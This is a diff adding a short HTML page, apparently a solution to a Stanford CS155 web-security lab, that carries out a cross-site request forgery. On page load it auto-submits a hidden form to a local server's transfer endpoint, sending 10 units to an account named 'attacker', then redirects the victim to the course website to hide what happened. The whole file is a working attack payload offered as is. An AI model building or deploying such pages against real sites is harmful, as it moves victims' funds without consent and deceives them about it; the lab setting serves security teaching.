@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <iframe style="display:none" name="hidden_iframe"></iframe>
+    <form action="http://localhost:3000/post_transfer" method="POST" target="hidden_iframe" id="csrf-form">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value="10">
+    </form>
+    <script>
+        window.onload = function () {
+            document.getElementById('csrf-form').submit();
+            setTimeout(function () {
+                window.location.href = "https://cs155.stanford.edu/";
+            }, 1000); // Adjust the timeout as needed
+        };
+    </script>
+</body>
+
+</html>
